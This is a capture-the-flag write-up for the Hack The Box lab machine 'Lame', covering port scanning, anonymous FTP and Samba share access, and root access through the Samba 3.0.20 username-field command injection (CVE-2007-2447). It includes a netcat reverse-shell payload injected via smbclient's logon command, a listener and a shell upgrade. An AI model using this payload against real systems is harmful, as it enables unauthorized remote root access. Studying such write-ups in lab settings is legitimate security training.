#  Lame

![lame_machine_info_card](./assets/lame_machine_info_card.png)

Machine: [https://app.hackthebox.com/machines/Lame](https://app.hackthebox.com/machines/Lame)

Created by: [ch4p](https://app.hackthebox.com/users/1)

Difficulty: Easy

OS: Linux

## Machine Info

Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement. 

## Enumeration

### Nmap

```shell
labadmin@labmachine:~/lame$ nmap -sV -sC -oN lame-sv-nmap.log 10.10.10.3
Starting Nmap 7.95 ( https://nmap.org ) at 2024-06-26 16:02 JST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.23 seconds
labadmin@labmachine:~/lame$ nmap -Pn -sV -sC -oN lame-sv-nmap.log 10.10.10.3
Starting Nmap 7.95 ( https://nmap.org ) at 2024-06-26 16:02 JST
Nmap scan report for 10.10.10.3
Host is up (0.38s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.17
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2024-06-26T03:04:10-04:00
|_clock-skew: mean: 2h00m21s, deviation: 2h49m46s, median: 18s
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.82 seconds
```

Nmap reveals 4 ports.
- 21/tcp  open  ftp         vsftpd 2.3.4
- 22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
- 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
- 445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

### FTP port 21

We can login the ftp `anonymous/anonymous` credentials. But we find nothing there.

```shell
labadmin@labmachine:~/lame$ ftp 10.10.10.3
Connected to 10.10.10.3 (10.10.10.3).
220 (vsFTPd 2.3.4)
Name (10.10.10.3:labadmin): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
227 Entering Passive Mode (10,10,10,3,148,150).
150 Here comes the directory listing.
226 Directory send OK.
ftp>
```

### Samba port 139/445

We try to list the available shares and run into this issue.

```shell
smbclient -L 10.10.10.3
Protocol negotiation to server 10.10.10.3 (for a protocol between SMB2_02 and SMB3) failed: NT_STATUS_CONNECTION_DISCONNECTED
```

This is due to use of different Samba version and we add the following under `global` in `/etc/samba/smb.conf` to ensure compatibility.

```shell
[global]
        client min protocol = CORE
        client max protocol = SMB3
```

Now we use try list the shares again leaving the password blank. We find 5 shares and that the Samba version is 3.00.20-Debian.

```shell
labadmin@labmachine:~/lame$ smbclient -L 10.10.10.3
Password for [SAMBA\labadmin]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))

```

The share `tmp` with comment `oh noes!` looks interesting. We connect it, once again using bland password.

```shell
labadmin@labmachine:~/lame$ smbclient \\\\10.10.10.3\\tmp
Password for [SAMBA\labadmin]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun 26 16:50:50 2024
  ..                                 DR        0  Sat Oct 31 15:33:58 2020
  5583.jsvc_up                        R        0  Wed Jun 26 15:57:43 2024
  .ICE-unix                          DH        0  Wed Jun 26 15:56:40 2024
  vmware-root                        DR        0  Wed Jun 26 15:56:57 2024
  .X11-unix                          DH        0  Wed Jun 26 15:57:07 2024
  .X0-lock                           HR       11  Wed Jun 26 15:57:07 2024
  vgauthsvclog.txt.0                  R     1600  Wed Jun 26 15:56:37 2024

                7282168 blocks of size 1024. 5386504 blocks available
smb: \> 
```

We could download `vgauthsvclog.txt.0` but it didn't gave anything.

```shell
smb: \> mget *
Get file 5583.jsvc_up? y
NT_STATUS_ACCESS_DENIED opening remote file \5583.jsvc_up
Get file .X0-lock? y
getting file \.X0-lock of size 11 as .X0-lock (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
Get file vgauthsvclog.txt.0? y
getting file \vgauthsvclog.txt.0 of size 1600 as vgauthsvclog.txt.0 (0.8 KiloBytes/sec) (average 0.5 KiloBytes/sec)
```

Searching online for Samba version 3.0.20 we find this vulnerability that allows remote attackers to execute arbitrary commands. It allows to run commands via the username parameter.

[https://www.cve.org/CVERecord?id=CVE-2007-2447](https://www.cve.org/CVERecord?id=CVE-2007-2447)
[https://www.samba.org/samba/security/CVE-2007-2447.html](https://www.samba.org/samba/security/CVE-2007-2447.html)

We will use this to setup a reverse shell.

First we setup a local Netcat listener.

```shell
labadmin@labmachine:~/lame$ nc -lvnp 6000
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:6000
Ncat: Listening on 0.0.0.0:6000
```

Next we will execute `logon` in the samba server with our payload to connect our local listener for reverse shell. For password leave blank and hit enter.

```shell
smb: \> logon "/=`nohup nc 10.10.16.17 6000 -e /bin/bash`"
Password: 

```

And back to our locla listener and we have reverse shell as root.

```shell
labadmin@labmachine:~/lame$ nc -lvnp 6000
Ncat: Version 7.95 ( https://nmap.org/ncat )
Ncat: Listening on [::]:6000
Ncat: Listening on 0.0.0.0:6000
Ncat: Connection from 10.10.10.3:45573.
whoami
root

```

And we upgrade shell to full TTY by python.


```shell
which python
/usr/bin/python
python -c 'import pty; pty.spawn("/bin/bash")'
root@lame:/#
```

User flag we found under makis.

```shell
root@lame:/# cat /home/makis/user.txt
cat /home/makis/user.txt
[...OMITTED...]

```

Root flag we find under root.

```shell
root@lame:/# cat /root/root.txt
cat /root/root.txt
[...OMITTED...]

```
